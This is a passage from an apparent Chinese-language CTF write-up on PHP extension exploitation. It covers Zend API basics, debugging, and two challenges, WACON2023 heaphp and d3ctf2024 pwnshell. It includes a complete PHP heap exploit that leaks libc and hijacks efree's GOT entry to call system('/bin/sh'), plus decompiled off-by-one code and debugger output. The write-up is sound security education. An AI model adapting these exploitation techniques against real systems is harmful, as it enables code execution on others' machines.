<td>Boolean</td>
</tr>
<tr>
<td>l</td>
<td>Integer</td>
</tr>
<tr>
<td>d</td>
<td>Float</td>
</tr>
<tr>
<td>s</td>
<td>String</td>
</tr>
<tr>
<td>r</td>
<td>Resource</td>
</tr>
<tr>
<td>a</td>
<td>Array</td>
</tr>
<tr>
<td>o</td>
<td>Object</td>
</tr>
<tr>
<td>O</td>
<td>特定类型的Object</td>
</tr>
<tr>
<td>z</td>
<td>任意类型</td>
</tr>
<tr>
<td>Z</td>
<td>zval**类型</td>
</tr>
<tr>
<td>f</td>
<td>表示函数、方法名称</td>
</tr>
</tbody>
</table>
</div>
<p>举个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure>
<p>该表达式则是获取两个参数 <code>str</code> 和 <code>n</code>，字符串的类型是<code>s</code>，需要两个参数 <code>char *</code> 字符串和 <code>int</code> 长度；数字的类型 <code>l</code> ，只需要一个参数。</p>
<h3 id="string相关"><a href="#string相关" class="headerlink" title="string相关"></a>string相关</h3><h4 id="str-pad"><a href="#str-pad" class="headerlink" title="str_pad"></a>str_pad</h4><p>填充字符串到指定长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">str_pad</span>(<span class="keyword">string</span> <span class="variable">$input</span>, <span class="keyword">int</span> <span class="variable">$pad_length</span>, <span class="keyword">string</span> <span class="variable">$pad_string</span> = <span class="string">&quot; &quot;</span>, <span class="keyword">int</span> <span class="variable">$pad_type</span> = STR_PAD_RIGHT): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>$input</code>：要填充的字符串。</li>
<li><code>$pad_length</code>：填充后的字符串长度。</li>
<li><code>$pad_string</code>：可选，用于填充的字符，默认为空格。</li>
<li><code>$pad_type</code>：可选，填充类型，默认为 <code>STR_PAD_RIGHT</code>，还可以是 <code>STR_PAD_LEFT</code> 或 <code>STR_PAD_BOTH</code>。</li>
</ul>
<h4 id="str-repeat"><a href="#str-repeat" class="headerlink" title="str_repeat"></a>str_repeat</h4><p><code>str_repeat()</code> 是 PHP 中的一个内置函数，用于重复一个字符串若干次。</p>
<p>它的语法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">str_repeat</span> ( <span class="keyword">string</span> <span class="variable">$input</span> , <span class="keyword">int</span> <span class="variable">$multiplier</span> )</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>$input</code>：要重复的字符串。</li>
<li><code>$multiplier</code>：重复的次数，必须是一个整数</li>
</ul>
<h3 id="输出缓冲区"><a href="#输出缓冲区" class="headerlink" title="输出缓冲区"></a>输出缓冲区</h3><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p><code>ob_start()</code> 是 PHP 中的一个内置函数，用于启动输出缓冲。当启用输出缓冲后，所有后续的输出不会直接发送到客户端，而是存储在内存中的缓冲区中，直到缓冲区被刷新或关闭。</p>
<p><code>ob_start()</code> 函数的语法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">ob_start</span> ([ <span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">NULL</span> [, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS ]]] )</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>$output_callback</code>：可选参数，指定一个回调函数，用于处理输出缓冲中的内容。当指定了此参数时，缓冲区中的内容会被传递给该回调函数进行处理。</li>
<li><code>$chunk_size</code>：可选参数，指定每次写入缓冲区的字节数，默认为 0，表示不限制字节数。</li>
<li><code>$flags</code>：可选参数，用于设置输出处理的标志，通常使用默认值 <code>PHP_OUTPUT_HANDLER_STDFLAGS</code>。</li>
</ul>
<h4 id="ob-get-content"><a href="#ob-get-content" class="headerlink" title="ob_get_content()"></a>ob_get_content()</h4><p><code>ob_get_contents()</code> 是 PHP 中的一个内置函数，用于获取当前输出缓冲区的内容，并返回缓冲区的内容作为字符串。</p>
<p>它的语法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>|<span class="literal">false</span> <span class="title function_ invoke__">ob_get_contents</span> ([ <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">string</span> <span class="variable">$chunk_size</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$length</span> ]]] )</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>$flags</code>：可选参数，用于指定获取缓冲区内容的选项，默认为0。</li>
<li><code>$chunk_size</code>：可选参数，用于指定每次读取缓冲区的字节数，默认为-1，表示读取全部内容。</li>
<li><code>$length</code>：可选参数，如果指定了该参数并且 <code>$flags</code> 设置为 <code>PHP_OUTPUT_HANDLER_FLUSHABLE</code>，则该参数将用于返回读取的字节数。</li>
</ul>
<h4 id="ob-end-flush"><a href="#ob-end-flush" class="headerlink" title="ob_end_flush"></a>ob_end_flush</h4><p><code>ob_end_flush()</code> 是 PHP 中的一个内置函数，用于结束当前的输出缓冲并将缓冲区的内容输出到浏览器。同时，它也会关闭当前的输出缓冲区，使之后的输出直接发送到客户端而不经过缓冲。</p>
<p>它的语法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ob_end_flush</span> <span class="params">( <span class="type">void</span> )</span></span><br></pre></td></tr></table></figure>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><code>gdb php</code></p>
<p>先<code>set args -c php.ini</code>空跑一遍,加载so拓展,然后下断点</p>
<p>再<code>set args -c php.ini exp.php</code>然后即可进行调试</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h2><p><a target="_blank" rel="noopener" href="https://deepunk.icu/php-pwn/">PHP 堆利用简介 —- A Brief Introduction to PHP Heap Exploitation (deepunk.icu)</a></p>
<p>给了一个heaphp.so文件,应该就是存在漏洞的拓展文件</p>
<p>保护基本全开,除了Partial RELRO</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/heaphp/src/stuff/heaphp.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>这题甚至保留了note结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_166)</span><br><span class="line"><span class="number">00000000</span> title db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="number">00000020</span> size dq ?</span><br><span class="line"><span class="number">00000028</span> content dq ?                            ; offset</span><br><span class="line"><span class="number">00000030</span> note ends</span><br></pre></td></tr></table></figure>
<p>因为是复现就不把所有函数都分析出来了</p>
<p>漏洞出在<code>zif_add_node</code>,创建一个新的note的时候会需要两个字符串参数,第一个作为note而当title,第二个作为note的content,并且只检测了第一个字符串的长度,第二个字符串是使用string结构描述符中的真实长度</p>
<p>十分关键的就是复制字符串2到note-&gt;content时使用的是memcpy</p>
<p>而申请content时却又是根据strlen来申请大小</p>
<p>这意味着如果这个字符串被<code>\0</code>截断那么最终复制的str2会发生溢出</p>
<p>那么就可以覆盖下一个堆块的fd指针,从而做到任意地址分配</p>
<p>通过覆盖任意笔记的内容指针，我们可以通过 <code>zif_view_note</code> 获取任意地址的内容。</p>
<p><strong>exp:</strong></p>
<p>真正调用时函数名字不需要前面的<code>zif_</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// function mychr($index)&#123;</span></span><br><span class="line">	<span class="comment">// 	return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">	    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">	        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line">	<span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">	    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line">	<span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">	    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">	    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">	    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line">	<span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line">	<span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line">	<span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
<p>phppwn是没办法直接交互的,所以最终必须要想办法拿到flag,可以重定向到某个新文件,或者反弹shell</p>
<h2 id="d3ctf2024-pwnshell"><a href="#d3ctf2024-pwnshell" class="headerlink" title="d3ctf2024-pwnshell"></a>d3ctf2024-pwnshell</h2><p>热乎的题目</p>
<p>note的结构大致如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_8, variable size)</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> len dq ?</span><br><span class="line"><span class="number">00000010</span> des db <span class="number">0</span> dup(?)</span><br><span class="line"><span class="number">00000010</span> node ends</span><br></pre></td></tr></table></figure>
<p>chunklist的结构大致如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_9)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .bss:chunkList/r</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> inuse dd ?</span><br><span class="line"><span class="number">0000000</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000000F</span> db ? ; undefined</span><br><span class="line"><span class="number">00000010</span> <span class="built_in">list</span> ends</span><br></pre></td></tr></table></figure>
<p>在addHacker中存在off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      p_inuse = &amp;chunkList[<span class="number">0</span>].inuse;</span><br><span class="line">      <span class="keyword">while</span> ( *(_BYTE *)p_inuse != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        p_inuse += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[v2];</span><br><span class="line">      v8 = (node *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">      v9 = (<span class="type">char</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>));</span><br><span class="line">      v8-&gt;ptr = v9;</span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>);</span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">24LL</span>);</span><br><span class="line">      v8-&gt;len = v10;</span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);</span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8-&gt;des, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">16LL</span>);</span><br><span class="line">      v7-&gt;ptr = (<span class="type">char</span> *)v8;</span><br><span class="line">      v7-&gt;inuse = <span class="number">13</span>;</span><br><span class="line">      v8-&gt;des[v13] = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>off-by-one在zendmm分配器情况下是十分危险的,因为一个page所有的空闲块都会在链上,且没有random_list和hardend_list这样的保护</p>
<p>完全是裸的出现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff5400000</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff5400008</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff5400010</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff5400018</span> ◂— <span class="number">0x9300000175</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff5400020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffff5400050</span> ◂— <span class="number">0x617d8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffff5400058</span> ◂— <span class="number">0x6a1d8</span></span><br><span class="line"><span class="number">0</span>c:<span 